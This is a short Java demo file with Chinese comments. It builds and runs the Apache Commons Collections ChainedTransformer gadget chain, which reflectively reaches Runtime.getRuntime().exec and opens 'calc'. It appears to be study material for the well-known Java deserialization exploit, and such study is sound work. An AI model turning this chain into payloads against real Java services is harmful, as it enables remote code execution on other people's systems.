package com.xiwei.demo;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class TestChainedTransformer {
    public static void main(String[] args) {
        Transformer[] transformer = new Transformer[]{
                // ConstantTransformer.transform返回 java.lang.Runtime
                new ConstantTransformer(Runtime.class),
                // InvokerTransformer反射getClass获取到传入到runtime 会变成 java.lang.class 利用 java.lang.class 中的 getMethod 获取getRuntime
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",new Class[0]}),   // 返回的是getRuntime的方法
                // 上面返回的应该是getRuntime的这个静态方法 获取反射类中的invoke类执行getRuntime
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                // 调用返回实例中的exec
                new InvokerTransformer("exec", new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer run = new ChainedTransformer(transformer);
        run.transform(null);


        //上面代码等效下面代码
//        ConstantTransformer temp1 = new ConstantTransformer(Runtime.class);
//        Object result1 = temp1.transform(null);
//        Transformer temp2 = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",new Class[0]});
//        Object result2 = temp2.transform(result1);
//        Transformer temp3 = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null});
//        Object result3 = temp3.transform(result2);
//        Transformer temp4 = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
//        temp4.transform(result3);

    }
}